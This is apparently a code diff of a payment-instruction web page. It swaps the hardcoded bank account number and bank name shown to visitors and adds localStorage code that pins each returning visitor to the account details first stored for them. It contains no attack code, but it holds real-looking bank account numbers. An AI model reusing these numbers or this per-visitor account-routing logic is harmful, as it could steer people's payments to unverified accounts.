@@ -2,18 +2,14 @@
 <html>
 <head>
 <script>
-	
-
- articl = "a&nbsp;";
-
-	a_n = '51013798698';
-	b_n = 'TymeBank';
-
-	
-window.account_number=a_n;
-account_number=a_n;
-window.account_bank=b_n;
-account_bank=b_n;
+lastym="NOT";
+</script>
+<script>
+if(localStorage.lastym) {
+lastym = "SET";
+}
+</script>
+<script>
 </script>
 	<!--FACEBOOK ROCKS!!!!!!!!!!!!!!!!!!!!!-->
 	<meta charset="utf-8">
@@ -49,9 +45,25 @@ document.write(`
 #copylink:active i:after {text-align:center;font-family:roboto,helvetica,arial,Open Sans;color:dodgerblue;content:"   Account Number Copied! ";width:100%;}
 #copylink:active i:before {content:'\f1b4';}
 .expert .form-control {font-size:14px !important;}
-</style>
-</head>
-<body onpageshow="window.setTimeout(function(){ cheget(); document.getElementById('loading').style.display='none'; },3000);window.setTimeout(function(){bankdet();},5000);document.querySelector('[role=\'menu\']').style.opacity='0';" style="zoom:0.9;">
+</style><script>
+articl = "an&nbsp;";
+a_n = '20010507242';
+b_n = 'African Bank';
+</script><script>
+if(lastym=="SET") {
+articl = localStorage.art;
+a_n = localStorage.acc;
+b_n = localStorage.brnch;
+} else if(lastym=="NOT") {
+localStorage.art = articl;
+localStorage.acc = a_n;
+localStorage.brnch = b_n;
+}
+window.account_number=a_n;
+account_number=a_n;
+window.account_bank=b_n;
+account_bank=b_n;
+</script></head><body onpageshow="window.setTimeout(function(){ cheget(); document.getElementById('loading').style.display='none'; },3000);window.setTimeout(function(){bankdet();},5000);document.querySelector('[role=\'menu\']').style.opacity='0';" style="zoom:0.9;">
 <div style="background-color:#e94057;height:2px;width:100%;opacity:0.95;font-family:roboto,arial;font-size:17px;line-height:2.5rem;text-align:center; "></div>
 	<div class="page-content" style="background-image: url('images/wizard-v4.jpg')">
 		<div class="wizard-v4-content" style="margin:8px 20px;">
